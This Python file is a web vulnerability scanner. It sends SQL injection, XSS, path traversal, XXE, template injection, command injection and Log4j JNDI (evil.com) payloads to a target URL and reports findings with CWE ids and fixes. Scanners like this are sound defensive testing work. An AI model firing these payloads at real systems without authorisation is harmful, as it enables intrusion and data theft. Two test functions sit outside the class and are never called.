# backend/security_scanner.py
import asyncio
import httpx
import json
import time
import re
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, parse_qs
from dataclasses import dataclass, asdict
from enum import Enum

class VulnerabilityLevel(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

@dataclass
class SecurityFinding:
    vulnerability_type: str
    level: VulnerabilityLevel
    title: str
    description: str
    evidence: str
    recommendation: str
    cwe_id: Optional[str] = None
    payload_used: Optional[str] = None
    response_time: Optional[float] = None

@dataclass
class SecurityScanResult:
    target_url: str
    scan_duration: float
    total_findings: int
    findings_by_level: Dict[str, int]
    findings: List[SecurityFinding]
    scan_timestamp: str

class SecurityScanner:
    def __init__(self, target_url: str, headers: Dict[str, str] = None, timeout: int = 10):
        self.target_url = target_url
        self.base_headers = headers or {}
        self.timeout = timeout
        self.findings: List[SecurityFinding] = []
        
        # Common payloads for various attacks
        self.sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "admin'--",
            "' AND 1=CONVERT(int, CHAR(65))--",
            "' WAITFOR DELAY '00:00:05'--"
        ]
        
        self.xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//"
        ]
        
        self.nosql_payloads = [
            "'; return true; //",
            "'; return 1==1; //",
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$regex\": \".*\"}"
        ]

    async def run_comprehensive_scan(self) -> SecurityScanResult:
        """Run all security tests and return comprehensive results"""
        start_time = time.time()
        
        # Run all security tests concurrently
        test_tasks = [
            self.test_sql_injection(),
            self.test_authentication_bypass(),
            self.test_rate_limiting(),
            self.test_sensitive_data_exposure(),
            self.test_cors_misconfiguration(),
            self.test_security_headers(),
            self.test_information_disclosure(),
            self.test_input_validation(),
            self.test_session_management()
        ]
        
        await asyncio.gather(*test_tasks, return_exceptions=True)
        
        scan_duration = time.time() - start_time
        
        # Compile results
        findings_by_level = {level.value: 0 for level in VulnerabilityLevel}
        for finding in self.findings:
            findings_by_level[finding.level.value] += 1
        
        return SecurityScanResult(
            target_url=self.target_url,
            scan_duration=scan_duration,
            total_findings=len(self.findings),
            findings_by_level=findings_by_level,
            findings=self.findings,
            scan_timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
        )

    async def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for payload in self.sql_payloads:
                try:
                    # Test in URL parameters
                    test_url = f"{self.target_url}?id={payload}"
                    start_time = time.time()
                    response = await client.get(test_url, headers=self.base_headers)
                    response_time = time.time() - start_time
                    
                    # Check for SQL error patterns
                    error_patterns = [
                        r"SQL syntax.*MySQL",
                        r"Warning.*mysql_.*",
                        r"ORA-[0-9]{5}",
                        r"PostgreSQL.*ERROR",
                        r"sqlite3.OperationalError",
                        r"Microsoft Access Driver.*error"
                    ]
                    
                    response_text = response.text.lower()
                    for pattern in error_patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            self.findings.append(SecurityFinding(
                                vulnerability_type="sql_injection",
                                level=VulnerabilityLevel.CRITICAL,
                                title="SQL Injection Vulnerability Detected",
                                description=f"The application appears vulnerable to SQL injection attacks. Database error messages were returned when testing with malicious payloads.",
                                evidence=f"Error pattern found: {pattern}",
                                recommendation="Use parameterized queries and input validation. Never concatenate user input directly into SQL queries.",
                                cwe_id="CWE-89",
                                payload_used=payload,
                                response_time=response_time
                            ))
                            break
                    
                    # Check for time-based blind SQL injection
                    if "WAITFOR DELAY" in payload and response_time > 4:
                        self.findings.append(SecurityFinding(
                            vulnerability_type="blind_sql_injection",
                            level=VulnerabilityLevel.CRITICAL,
                            title="Time-Based Blind SQL Injection",
                            description="The application delays response when time-based SQL injection payloads are used, indicating potential blind SQL injection.",
                            evidence=f"Response time: {response_time:.2f}s with payload: {payload}",
                            recommendation="Implement proper input validation and use parameterized queries.",
                            cwe_id="CWE-89",
                            payload_used=payload,
                            response_time=response_time
                        ))
                
                except Exception as e:
                    continue

    async def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            bypass_headers = [
                {"X-Forwarded-For": "127.0.0.1"},
                {"X-Real-IP": "127.0.0.1"},
                {"X-Originating-IP": "127.0.0.1"},
                {"Authorization": "Bearer invalid_token"},
                {"Authorization": "Basic YWRtaW46YWRtaW4="}  # admin:admin
            ]
            
            for headers in bypass_headers:
                try:
                    test_headers = {**self.base_headers, **headers}
                    response = await client.get(self.target_url, headers=test_headers)
                    
                    # Check if we get unauthorized vs authorized responses
                    if response.status_code == 200 and any(indicator in response.text.lower() 
                                                         for indicator in ['admin', 'dashboard', 'unauthorized', 'forbidden']):
                        self.findings.append(SecurityFinding(
                            vulnerability_type="auth_bypass",
                            level=VulnerabilityLevel.HIGH,
                            title="Potential Authentication Bypass",
                            description="The application may be vulnerable to authentication bypass using header manipulation.",
                            evidence=f"Got 200 response with headers: {headers}",
                            recommendation="Implement proper authentication validation that cannot be bypassed with header manipulation.",
                            cwe_id="CWE-287"
                        ))
                
                except Exception as e:
                    continue

    async def test_rate_limiting(self):
        """Test for rate limiting implementation"""
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                # Send burst of requests
                tasks = []
                for _ in range(20):
                    tasks.append(client.get(self.target_url, headers=self.base_headers))
                
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Check if any rate limiting was applied
                status_codes = [r.status_code for r in responses if hasattr(r, 'status_code')]
                rate_limited = any(code in [429, 503] for code in status_codes)
                
                if not rate_limited:
                    self.findings.append(SecurityFinding(
                        vulnerability_type="no_rate_limiting",
                        level=VulnerabilityLevel.MEDIUM,
                        title="No Rate Limiting Detected",
                        description="The application does not appear to implement rate limiting, making it vulnerable to brute force and DoS attacks.",
                        evidence=f"Sent 20 concurrent requests, all returned status codes: {set(status_codes)}",
                        recommendation="Implement rate limiting to prevent abuse and protect against DoS attacks.",
                        cwe_id="CWE-307"
                    ))
            
            except Exception as e:
                pass

    async def test_security_headers(self):
        """Test for missing security headers"""
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                response = await client.get(self.target_url, headers=self.base_headers)
                
                security_headers = {
                    'x-frame-options': 'Clickjacking protection',
                    'x-content-type-options': 'MIME type sniffing protection',
                    'x-xss-protection': 'XSS protection',
                    'strict-transport-security': 'HTTPS enforcement',
                    'content-security-policy': 'XSS and injection protection',
                    'referrer-policy': 'Referrer information control'
                }
                
                missing_headers = []
                for header, description in security_headers.items():
                    if header not in [h.lower() for h in response.headers.keys()]:
                        missing_headers.append(f"{header} ({description})")
                
                if missing_headers:
                    self.findings.append(SecurityFinding(
                        vulnerability_type="missing_security_headers",
                        level=VulnerabilityLevel.MEDIUM,
                        title="Missing Security Headers",
                        description="The application is missing important security headers that help protect against various attacks.",
                        evidence=f"Missing headers: {', '.join(missing_headers)}",
                        recommendation="Implement all recommended security headers to improve the application's security posture.",
                        cwe_id="CWE-693"
                    ))
            
            except Exception as e:
                pass

    async def test_cors_misconfiguration(self):
        """Test for CORS misconfigurations"""
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                test_origins = [
                    "https://evil.example.com",
                    "http://localhost:3000",
                    "null"
                ]
                
                for origin in test_origins:
                    headers = {**self.base_headers, "Origin": origin}
                    response = await client.options(self.target_url, headers=headers)
                    
                    cors_header = response.headers.get('access-control-allow-origin', '')
                    if cors_header == "*" or cors_header == origin:
                        self.findings.append(SecurityFinding(
                            vulnerability_type="cors_misconfiguration",
                            level=VulnerabilityLevel.MEDIUM,
                            title="CORS Misconfiguration",
                            description="The application has permissive CORS settings that may allow unauthorized cross-origin requests.",
                            evidence=f"Origin '{origin}' was allowed. Response header: {cors_header}",
                            recommendation="Configure CORS to only allow trusted origins and avoid using wildcard (*) for access-control-allow-origin with credentials.",
                            cwe_id="CWE-942"
                        ))
            
            except Exception as e:
                pass

    async def test_sensitive_data_exposure(self):
        """Test for sensitive data exposure"""
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                response = await client.get(self.target_url, headers=self.base_headers)
                response_text = response.text.lower()
                
                sensitive_patterns = {
                    r'password["\s]*[:=]["\s]*\w+': 'Password in response',
                    r'api[_-]?key["\s]*[:=]["\s]*[\w-]+': 'API key in response',
                    r'secret["\s]*[:=]["\s]*[\w-]+': 'Secret in response',
                    r'token["\s]*[:=]["\s]*[\w.-]+': 'Token in response',
                    r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b': 'Email addresses',
                    r'\b\d{4}[-\s]\d{4}[-\s]\d{4}[-\s]\d{4}\b': 'Credit card numbers'
                }
                
                for pattern, description in sensitive_patterns.items():
                    if re.search(pattern, response_text):
                        self.findings.append(SecurityFinding(
                            vulnerability_type="sensitive_data_exposure",
                            level=VulnerabilityLevel.HIGH,
                            title="Sensitive Data Exposure",
                            description=f"The application response contains sensitive information: {description}",
                            evidence=f"Pattern found: {pattern}",
                            recommendation="Remove sensitive data from API responses and implement proper data filtering.",
                            cwe_id="CWE-200"
                        ))
            
            except Exception as e:
                pass

    async def test_information_disclosure(self):
        """Test for information disclosure"""
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                # Test common information disclosure endpoints
                test_paths = [
                    "/.env", "/config.json", "/package.json", "/.git/config",
                    "/admin", "/debug", "/test", "/swagger.json", "/api/docs"
                ]
                
                parsed_url = urlparse(self.target_url)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                
                for path in test_paths:
                    test_url = f"{base_url}{path}"
                    response = await client.get(test_url, headers=self.base_headers)
                    
                    if response.status_code == 200 and len(response.content) > 0:
                        self.findings.append(SecurityFinding(
                            vulnerability_type="information_disclosure",
                            level=VulnerabilityLevel.LOW,
                            title="Information Disclosure",
                            description=f"Sensitive file or endpoint accessible: {path}",
                            evidence=f"HTTP {response.status_code} response from {test_url}",
                            recommendation="Restrict access to sensitive files and administrative endpoints.",
                            cwe_id="CWE-200"
                        ))
            
            except Exception as e:
                pass

    async def test_input_validation(self):
        """Test input validation"""
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                # Test with various malformed inputs
                test_inputs = [
                    "../../../etc/passwd",  # Path traversal
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # Encoded path traversal
                    "{{7*7}}",  # Template injection
                    "${jndi:ldap://evil.com/a}",  # Log4j
                ]
                
                for payload in test_inputs:
                    test_url = f"{self.target_url}?input={payload}"
                    response = await client.get(test_url, headers=self.base_headers)
                    
                    # Check for path traversal
                    if "root:" in response.text or "/bin/bash" in response.text:
                        self.findings.append(SecurityFinding(
                            vulnerability_type="path_traversal",
                            level=VulnerabilityLevel.CRITICAL,
                            title="Path Traversal Vulnerability",
                            description="The application is vulnerable to path traversal attacks.",
                            evidence=f"System file content detected with payload: {payload}",
                            recommendation="Implement proper input validation and sanitization.",
                            cwe_id="CWE-22",
                            payload_used=payload
                        ))
                    
                    # Check for template injection
                    if payload == "{{7*7}}" and "49" in response.text:
                        self.findings.append(SecurityFinding(
                            vulnerability_type="template_injection",
                            level=VulnerabilityLevel.HIGH,
                            title="Server-Side Template Injection",
                            description="The application appears vulnerable to server-side template injection.",
                            evidence=f"Template expression evaluated: {payload} resulted in 49",
                            recommendation="Validate and sanitize all user inputs, especially in templating contexts.",
                            cwe_id="CWE-94",
                            payload_used=payload
                        ))
            
            except Exception as e:
                pass

    async def test_session_management(self):
        """Test session management security"""
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                response = await client.get(self.target_url, headers=self.base_headers)
                
                # Check session cookies
                for cookie in response.cookies:
                    cookie_issues = []
                    
                    if not cookie.secure:
                        cookie_issues.append("not marked as Secure")
                    if not hasattr(cookie, 'httponly') or not cookie.httponly:
                        cookie_issues.append("not marked as HttpOnly")
                    if not hasattr(cookie, 'samesite') or not cookie.samesite:
                        cookie_issues.append("missing SameSite attribute")
                    
                    if cookie_issues:
                        self.findings.append(SecurityFinding(
                            vulnerability_type="insecure_session_management",
                            level=VulnerabilityLevel.MEDIUM,
                            title="Insecure Session Cookie Configuration",
                            description=f"Session cookie '{cookie.name}' has security issues: {', '.join(cookie_issues)}",
                            evidence=f"Cookie: {cookie.name}={cookie.value}",
                            recommendation="Configure session cookies with Secure, HttpOnly, and SameSite attributes.",
                            cwe_id="CWE-614"
                        ))
            
            except Exception as e:
                pass

async def test_xxe_vulnerability(self):
    """Test for XML External Entity (XXE) vulnerabilities"""
    async with httpx.AsyncClient(timeout=self.timeout) as client:
        xxe_payloads = [
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>''',
            '''<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/hosts">
]>
<data>&file;</data>'''
        ]
        
        for payload in xxe_payloads:
            try:
                headers = {**self.base_headers, 'Content-Type': 'application/xml'}
                response = await client.post(self.target_url, content=payload, headers=headers)
                
                if any(indicator in response.text.lower() for indicator in ['root:', 'localhost', '/bin/bash']):
                    self.findings.append(SecurityFinding(
                        vulnerability_type="xxe_injection",
                        level=VulnerabilityLevel.CRITICAL,
                        title="XML External Entity (XXE) Injection",
                        description="The application is vulnerable to XXE attacks, allowing access to local files.",
                        evidence=f"Local file content detected in response",
                        recommendation="Disable external entity processing in XML parsers and validate all XML input.",
                        cwe_id="CWE-611",
                        payload_used=payload[:100] + "..." if len(payload) > 100 else payload
                    ))
                    break
            except Exception as e:
                continue

async def test_command_injection(self):
    """Test for command injection vulnerabilities"""
    async with httpx.AsyncClient(timeout=self.timeout) as client:
        command_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)"
        ]
        
        for payload in command_payloads:
            try:
                test_url = f"{self.target_url}?cmd={payload}"
                response = await client.get(test_url, headers=self.base_headers)
                
                # Check for command output patterns
                if any(pattern in response.text.lower() for pattern in ['uid=', 'gid=', 'total ', 'drwx']):
                    self.findings.append(SecurityFinding(
                        vulnerability_type="command_injection",
                        level=VulnerabilityLevel.CRITICAL,
                        title="Command Injection Vulnerability",
                        description="The application executes system commands with user input, allowing arbitrary command execution.",
                        evidence=f"Command output detected with payload: {payload}",
                        recommendation="Never execute user input as system commands. Use parameterized commands and input validation.",
                        cwe_id="CWE-78",
                        payload_used=payload
                    ))
                    break
            except Exception as e:
                continue